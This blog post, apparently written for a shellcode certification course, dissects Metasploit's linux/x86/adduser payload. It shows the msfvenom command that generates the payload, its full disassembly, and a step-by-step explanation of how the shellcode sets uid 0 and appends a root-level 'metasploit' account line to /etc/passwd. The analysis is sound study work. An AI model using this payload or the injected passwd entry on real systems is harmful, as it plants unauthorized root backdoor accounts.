---
layout: post
title: "SLAE Problem 5.2: Msfvenom Analysis of linux/x86/adduser"
description: "Analysis of Msfvenom shellcode: linux/x86/adduser"
tags: [asm, shellcode, msfvenom]
---


This blog post has been created for completing the requirements for the SecurityTube
Linux Assembly Expert certification:
[<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert)

Student ID: SLAE-824

## Requirements

- Choose at least 3 shellcode samples created using Msfvenom for linux/x86
- Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
- Present your analysis

### Analysis

The next shellcode I would like to look at is linux/x86/adduser. My prediction
for this shellcode is that it essentially just runs execve with
`/usr/sbin/adduser` and the arguments that it would require. Lets analyze the
assembly to find out!

Running:

{% highlight bash %}
msfvenom --payload linux/x86/adduser --payload-options
{% endhighlight %}

We see:

{% highlight bash %}
Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
PASS   metasploit       yes       The password for this user
SHELL  /bin/sh          no        The shell for this user
USER   metasploit       yes       The username to create
{% endhighlight %}

The username and password both default to `metasploit` and
the shell the user will be assigned will be /bin/sh. We will
most likely find these values as arguments to execve if our
prediction is correct. Lets export the shellcode:

Running `msfvenom --payload linux/x86/adduser R > adduser.bin` we
create our shellcode to analyze. Using `ndisasm -u adduser.bin` we get
the following assembly for analysis:

### /linux/x86/adduser Shellcode ASM


{% highlight nasm %}
;; 0x46       = 70
;; syscall 70 = sys_setreuid
;; man 2 setreuid looks like the following
;; int setreuid(uid_t ruid, uid_t euid);
xor ecx,ecx
mov ebx,ecx
push byte +0x46
pop eax
int 0x80

{% endhighlight %}

As illustrated in the comments, the above chunk of assembly
sets the real and effective user id of of the process to be
0 which elevates the privileges.


{% highlight nasm %}

;; 0x5       = 5
;; syscall 5 = sys_open
push byte +0x5
pop eax

;; Clear out ecx
xor ecx,ecx
;; Push 0x00000000
;; This will null terminate our string
push ecx

;; Build up a file as a string to open
push dword 0x64777373 ;; ‘dwss’
push dword 0x61702f2f ;; ‘ap//‘
push dword 0x6374652f ;; ‘cte/‘

;; Move a pointer to our file to open into ebx
mov ebx,esp

;; Increment ecx to 0x00000001
inc ecx

;; And move 0x4 into the high byte of cx
;; making cx 0x0401 as the flags passed to the open call
mov ch,0x4
int 0x80
{% endhighlight %}

The next chunk of assembly calls open. This opens the `/etc/passwd`
file with the flags of 0x0401. What does 0x0401 stand for? Well,
looking in `/usr/include/asm-generic/fcntl.h` we see:

{% highlight bash %}
define O_WRONLY        00000001
.. snip ..
define O_APPEND        00002000
{% endhighlight %}

The values specified in this header file are defined in octal. Our assembly is
using hex so we do a bit of conversion using gdb:

{% highlight bash %}
gdb --batch --ex "print /o 0x0401"
{% endhighlight %}

This tells us that our hex value actually equals 02001 in octal of which doing
00000001 | 00002000 = 00002001 or O_WRONLY | O_APPEND. This  indicates that we
have opened the file for reading and writing and in append mode. This will
ensure that the cursor is placed at the end of the file.

The next chunk of code gets interesting. We need the memory offsets
to help us a bit:

{% highlight nasm %}
00000025  93                xchg eax,ebx
00000026  E828000000        call dword 0x53
0000002B  6D                insd
0000002C  657461            gs jz 0x90
0000002F  7370              jnc 0xa1
00000031  6C                insb
00000032  6F                outsd
00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
0000003B  736A              jnc 0xa7
0000003D  3470              xor al,0x70
0000003F  3449              xor al,0x49
00000041  52                push edx
00000042  633A              arpl [edx],di
00000044  303A              xor [edx],bh
00000046  303A              xor [edx],bh
00000048  3A2F              cmp ch,[edi]
0000004A  3A2F              cmp ch,[edi]
0000004C  62696E            bound ebp,[ecx+0x6e]
0000004F  2F                das
00000050  7368              jnc 0xba
00000052  0A598B            or bl,[ecx-0x75]
00000055  51                push ecx
00000056  FC                cld
00000057  6A04              push byte +0x4
00000059  58                pop eax
0000005A  CD80              int 0x80

{% endhighlight %}

The xchg is our usual saving of the file descriptor
returned in eax. We then see a `call dword 0x53` and then
things start to get messy. We know about the jump call pop
technique from our SLAE course, maybe this call is leveraging
the fact that the next address will be popped on the stack. Looking
at the offsets in our disassembly and checking out the bytes from
0x53 on, we see `59 8B 51 fC 6A 04 58 CD 80`. Leveraging this
wonderful online [https://defuse.ca/online-x86-assembler.htm#disassembly2](assembler / disassembler)
we learn what those bytes represent:

{% highlight bash %}
0:  59                      pop    ecx
1:  8b 51 fc                mov    edx,DWORD PTR [ecx-0x4]
4:  6a 04                   push   0x4
6:  58                      pop    eax
7:  cd 80                   int    0x80
{% endhighlight %}

Sure enough the address of the next instruction that was placed on the stack
from our `call` instruction is popped into ecx. An offset from that value
is placed in edx which we will need to investigate a bit and then the
0x4 system call. Looking in `/usr/include/i386-linux-gnu/asm/unistd_32.h` we see
that this is `#define __NR_write 4`.

This makes sense. We just opened the /etc/passwd file and now we want to add
stuff to it. The write syscall signature looks like:

{% highlight c %}
ssize_t write(int fd, const void *buf, size_t count)
{% endhighlight %}

This means edx is the length of what is being written, ecx is the string
we want to write, ebx is the file descriptor to /etc/passwd and eax is our
write sys call number. So what would that offset from ecx equate to?
Zooming in on those bytes:

{% highlight bash %}
00000026  E828000000        call dword 0x53
0000002B  6D <--- ecx is pointing here
{% endhighlight %}

Moving backward 4 bytes from the 0x6D puts us at 0x28. This is the value
that is being used as the length of the buffer in the write syscall.

Converting 0x28 to decimal using gdb:

{% highlight bash %}
gdb --batch --ex "print /d 0x28"
$1 = 40
{% endhighlight %}

We see that 40 bytes is going to be written. Using GDB again:
_Note: 0x2B is the beginning of the gibberish, 0x28 is the 40 bytes
we just calculated._

{% highlight bash %}
gdb --batch --ex "print /x 0x2B + 0x28"
$1 = 0x53
{% endhighlight %}

We see that 0x53 is 40 bytes after our call instruction and is exactly
the byte that was referenced in the call command:

{% highlight bash %}
00000026  E828000000 call dword 0x53
{% endhighlight %}

Ok... Lets checkout the bytes of that gibberish and
see what they might translate to as ascii:

{% highlight bash %}
6D65746173706C6F69743A417A2F6449736A3470344952633A303A3A2F3A2F62696E2F73680A

Converted to ascii outputs:

metasploit:Az/dIsj4p4IRc:0::/:/bin/sh

{% endhighlight %}

Ok. That makes sense. This is the line that will be appended to the /etc/passwd
file in the format that linux would expect, e.g
`username:passwd:UID:GID:full_name:directory:shell`. The user, shell, and
presumably password all match up with the configuration that the payload
defaults to.

{% highlight nasm %}
push byte +0x1
pop eax
int 0x80
{% endhighlight %}

Finally we call exit to exit gracefully. So it turns out that my prediction was
completely inaccurate. Execve was not used to execute the `adduser` command.

¯\\_(ツ)_/¯
